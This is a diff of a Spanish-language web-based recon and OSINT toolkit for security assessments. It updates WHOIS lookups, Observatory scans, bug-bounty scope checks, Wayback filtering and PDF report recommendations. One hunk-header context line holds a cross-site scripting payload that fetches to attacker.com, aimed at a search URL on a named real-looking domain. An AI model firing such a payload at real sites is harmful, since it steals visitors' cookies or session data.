@@ -1926,7 +1926,7 @@ https://target.cepal.org/search?q=&lt;svg/onload=fetch('https://attacker.com?c='
 <div id="tk-wayback" class="tk-panel">
   <div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap;">
     <input class="tk-input" id="wayback-domain" placeholder="dominio.com" style="flex:3;font-size:.82rem;"/>
-    <select id="wayback-filter" class="tk-input" style="flex:1;font-size:.75rem;">
+    <select id="wayback-filter" class="tk-input" style="flex:1;font-size:.75rem;" onchange="runWayback()">
       <option value="all">Todos</option><option value="php">PHP</option><option value="api">API</option>
       <option value="admin">Admin</option><option value="login">Login</option><option value="backup">Backup</option>
       <option value="json">JSON/XML</option><option value="vuln">Vuln</option>
@@ -3342,10 +3342,26 @@ async function reconWHOIS(domain){
   var out=reconSection('WHOIS — '+domain);
   try{
     // who-dat.as93.net — free, no-CORS, no API key
-    var r=await fetch('https://who-dat.as93.net/'+encodeURIComponent(domain),{signal:AbortSignal.timeout(10000)});
-    if(!r.ok) throw new Error('HTTP '+r.status);
-    var d=await r.json();
-    if(d.error) throw new Error(d.error);
+    var d=null;
+    try{
+      var _wr=await fetch('https://who-dat.as93.net/'+encodeURIComponent(domain),{signal:AbortSignal.timeout(8000)});
+      if(_wr.ok){var _wj=await _wr.json();if(!_wj.error) d=_wj;}
+    }catch(_we){}
+    if(!d){
+      try{
+        var _rr=await fetch('https://rdap.org/domain/'+encodeURIComponent(domain),{signal:AbortSignal.timeout(8000)});
+        if(_rr.ok){
+          var _rj=await _rr.json();
+          d={domain:_rj.ldhName||domain};
+          (_rj.events||[]).forEach(function(ev){
+            if(ev.eventAction==='registration') d.important_dates={created:ev.eventDate};
+            if(ev.eventAction==='expiration') (d.important_dates=d.important_dates||{}).expiry=ev.eventDate;
+          });
+          (_rj.nameservers||[]).forEach(function(ns){(d.name_servers=d.name_servers||[]).push(ns.ldhName);});
+        }
+      }catch(_re){}
+    }
+    if(!d) throw new Error('WHOIS no disponible');
     var reg=d.registrar||{};
     var dates=d.important_dates||{};
     var contacts=d.contacts||{};
@@ -3496,7 +3512,7 @@ async function reconHeaders(domain){
   var out=reconSection('SECURITY HEADERS — '+domain);
   try{
     // MDN HTTP Observatory API v2
-    var scanUrl='https://observatory-api.mdn.mozilla.net/api/v2/scan?host='+encodeURIComponent(domain);
+    var scanUrl='https://observatory-api.mdn.mozilla.net/api/v2/analyze?host='+encodeURIComponent(domain);
     // Trigger scan
     await fetch(scanUrl,{method:'POST',signal:AbortSignal.timeout(8000)}).catch(function(){});
     // Poll up to 30s
@@ -6759,7 +6775,7 @@ async function runTarget(){
 
         // 2. Observatory fallback for grade
         try{
-          var obsUrl='https://observatory-api.mdn.mozilla.net/api/v2/scan?host='+encodeURIComponent(domain);
+          var obsUrl='https://observatory-api.mdn.mozilla.net/api/v2/analyze?host='+encodeURIComponent(domain);
           await fetch(obsUrl,{method:'POST',signal:AbortSignal.timeout(4000)}).catch(function(){});
           await new Promise(function(r){setTimeout(r,3500);});
           var obsR=await fetch(obsUrl,{signal:AbortSignal.timeout(7000)});
@@ -6874,37 +6890,31 @@ async function runTarget(){
     });
     tgtOut('</div>\n','');
 
-    // Email OSINT via emailrep.io (CORS-native, no key)
-    try{
-      var emailR=await fetch('https://emailrep.io/query/'+encodeURIComponent('test@'+domain),
-        {signal:AbortSignal.timeout(6000)});
-      if(emailR.ok){
-        // Get domain email pattern via haveibeenpwned domain search
-        var haveR=await fetch('https://haveibeenpwned.com/api/v3/breacheddomain/'+encodeURIComponent(domain),
-          {headers:{'hibp-api-key':''},signal:AbortSignal.timeout(5000)});
-      }
-    }catch(e){}
+    // Email reputation: derive from existing MX/SPF/DMARC data (already collected)
+    // No external API needed — we already have this data
 
     // Bug Bounty quick check
     tgtProgress(93,'Fase 5 · Bug Bounty scope...');
     try{
-      var bbR=await fetch('https://api.hackerone.com/v1/hackers/programs?page[size]=100',
+      // HackerOne public programs (no auth needed for public list via intigriti/bugcrowd APIs)
+      // Use Intigriti public API instead (actually public)
+      var bbR=await fetch('https://api.intigriti.com/core/researcher/programs?limit=50',
         {headers:{'Accept':'application/json'},signal:AbortSignal.timeout(8000)});
       if(bbR.ok){
         var bbD=await bbR.json();
-        var rootDom=domain.split('.').slice(-2).join('.');
-        var keyword=rootDom.split('.')[0];
-        var progs=(bbD.data||[]).filter(function(p){
-          var h=(p.attributes&&p.attributes.handle)||'';
-          var n=(p.attributes&&p.attributes.name)||'';
-          return h.toLowerCase().indexOf(keyword)>=0||n.toLowerCase().indexOf(keyword)>=0;
+        var progs=bbD.items||bbD.records||[];
+        var domainMatch=progs.filter(function(p){
+          var scope=JSON.stringify(p).toLowerCase();
+          return scope.includes(domain.toLowerCase())||scope.includes(domain.split('.')[0].toLowerCase());
         });
-        if(progs.length){
-          _targetData.bugBounty=progs;
-          tgtGood('Bug Bounty HackerOne: '+progs.length+' programa(s) — '+
-            progs.map(function(p){return (p.attributes&&p.attributes.name)||'';}).join(', '));
+        if(domainMatch.length){
+          tgtGood('Bug Bounty: '+domainMatch.length+' programa(s) encontrado(s) en Intigriti');
+          domainMatch.slice(0,3).forEach(function(p){
+            tgtRow('Programa BB',escH((p.name||p.handle||'—')+' — '+('maxBounty' in p?'$'+p.maxBounty:'')));
+          });
+          _targetData.bugBounty=domainMatch;
         } else {
-          tgtOut('<div style="padding-left:14px;font-family:var(--font);font-size:.62rem;color:rgba(0,255,65,.3);">// Sin programa HackerOne público encontrado</div>','');
+          tgtRow('Bug Bounty','Sin programa público detectado en Intigriti');
         }
       }
     }catch(e){}
@@ -8303,6 +8313,16 @@ async function runWayback(){
     o.innerHTML='<span style="color:var(--red)">// Error: '+escH(e.message)+'</span>\n';
   }
 }
+function waybackFilter(btn, val){
+  if(btn){
+    btn.closest('div').querySelectorAll('.wf-btn').forEach(function(b){b.classList.remove('active');});
+    btn.classList.add('active');
+  }
+  var sel=document.getElementById('wayback-filter');
+  if(sel) sel.value=val;
+  runWayback();
+}
+
 function waybackExport(){
   if(!_waybackURLs.length){alert('Ejecuta una búsqueda primero');return;}
   var b=new Blob([_waybackURLs.join('\n')],{type:'text/plain'});
@@ -8988,7 +9008,8 @@ function generateTargetPDF(mode){
       var missingHdrs=d.secHeaders._missing.map(function(m){return m.info.name;}).join(', ');
       execRecs.push({pri:'MEDIA',action:'Implementar cabeceras de seguridad HTTP faltantes: '+missingHdrs,impact:'Ausencia de estas cabeceras expone a usuarios a XSS, clickjacking y ataques de protocol downgrade',effort:'3-5 días'});
     } else {
-    if(d.cveDetails&&d.cveDetails.length>=10) execRecs.push({pri:'ALTA',action:'Implementar programa de patch management mensual ('+d.cveDetails.length+' CVEs acumulados)',impact:'Acumulación crítica indica ausencia de proceso de gestión de vulnerabilidades',effort:'Proceso continuo'});
+    var _totalCVEs=(d.cves&&d.cves.length)||0||(d.cveDetails&&d.cveDetails.length)||0;
+    if(_totalCVEs>=10) execRecs.push({pri:'ALTA',action:'Implementar programa de patch management mensual ('+_totalCVEs+' CVEs acumulados)',impact:'Acumulación crítica indica ausencia de proceso de gestión de vulnerabilidades',effort:'Proceso continuo'});
     if(d.ports&&d.ports.length>5) execRecs.push({pri:'MEDIA',action:'Auditoría de puertos expuestos — reducir superficie de ataque ('+d.ports.length+' detectados)',impact:'Cada puerto abierto innecesario es un vector potencial de ataque',effort:'1 semana'});
     if(d.subs&&d.subs.length>20) execRecs.push({pri:'MEDIA',action:'Inventario de subdominios — revisar '+d.subs.length+' activos detectados',impact:'Subdominios olvidados son vectores comunes de acceso inicial y phishing',effort:'2-3 semanas'});
       execRecs.push({pri:'BAJA',action:'Implementar cabeceras de seguridad HTTP (CSP, HSTS, X-Frame-Options, Permissions-Policy)',impact:'Mitiga XSS, clickjacking, y ataques de protocol downgrade',effort:'3-5 días'});
